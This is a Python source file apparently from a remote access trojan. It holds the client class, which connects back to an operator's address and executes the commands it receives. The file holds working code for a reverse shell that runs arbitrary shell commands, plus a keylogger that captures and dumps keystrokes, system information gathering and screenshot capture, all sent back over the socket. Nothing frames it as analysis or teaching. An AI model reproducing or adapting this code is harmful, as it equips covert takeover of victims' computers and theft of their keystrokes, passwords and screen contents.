class CLIENT:

    SOCK = None
    KEY  = ")J@NcRfU"
    KEYLOGGER_STATUS = False
    KEYLOGGER_STROKES = ""

    def __init__(self, _ip, _pt):
        self.ipaddress = _ip
        self.port      = _pt

    def send_data(self, tosend, encode=True):
        if encode:
            self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
        else:
            self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))

    def turn_keylogger(self, status):
        def on_press(key):
            if not self.KEYLOGGER_STATUS:
                return False

            key = str(key)
            if len(key.strip('\'')) == 1:
                self.KEYLOGGER_STROKES += key.strip('\'')
            else:
                self.KEYLOGGER_STROKES += ("[" + key + "]")

        def on_release(key):
            if not self.KEYLOGGER_STATUS:
                return False

        def logger():            
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()

        if status:
            if not self.KEYLOGGER_STATUS:
                self.KEYLOGGER_STATUS = True
                t = threading.Thread(target=logger)
                t.daemon = True
                t.start()
        else:
            self.KEYLOGGER_STATUS = False

    def execute(self, command):
        data = command.decode('utf-8').split(":")

        if data[0] == "shell":

            #print("Executing Shell: " + data[1])
            toexecute = data[1].rstrip(" ").lstrip(" ")
            toexecute = " ".join(toexecute.split())
            if toexecute.split(" ")[0] == "cd":
                try:
                    os.chdir(toexecute.split(" ")[1])
                    self.send_data("")
                except:
                    self.send_data("Error while changing directory!")
            else:
                try:
                    comm = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                    output, errors = comm.communicate()
                    self.send_data(output + errors)
                except FileNotFoundError:
                    self.send_data("No Such File or Directory")

        elif data[0] == "keylogger":

            #print("Executing Keylogger: " + data[1])
            if data[1] == "on":
                self.turn_keylogger(True)
                self.send_data("")
            elif data[1] == "off":
                self.turn_keylogger(False)
                self.send_data("")
            elif data[1] == "dump":
                self.send_data(self.KEYLOGGER_STROKES)

        elif data[0] == "sysinfo":

            #print("Executing Sysinfo: " + data[1])
            sysinfo = SYSINFO()
            self.send_data(sysinfo.get_data())

        elif data[0] == "screenshot":

            #print("Executing Screenshot: " + data[1])
            screenshot = SCREENSHOT()
            self.send_data(screenshot.get_data(), encode=False)

    def acceptor(self):
        data = ""
        chunk = b""

        while True:
            chunk = self.SOCK.recv(4096)
            if not chunk:
                break
            data += chunk.decode('utf-8')

            if self.KEY.encode('utf-8') in chunk:
                data = data.rstrip(self.KEY)
                t = threading.Thread(target=self.execute, args=(base64.decodebytes(data.encode('utf-8')),))
                t.daemon = True
                t.start()
                data = ""

    def engage(self):
        self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        while True:
            try:
                print("Connecting To: %s:%d" % (self.ipaddress, self.port))
                self.SOCK.connect((self.ipaddress, self.port))
            except:
                print("Failed to Connect. Trying Again!")
                time.sleep(8)
                continue

            self.acceptor()
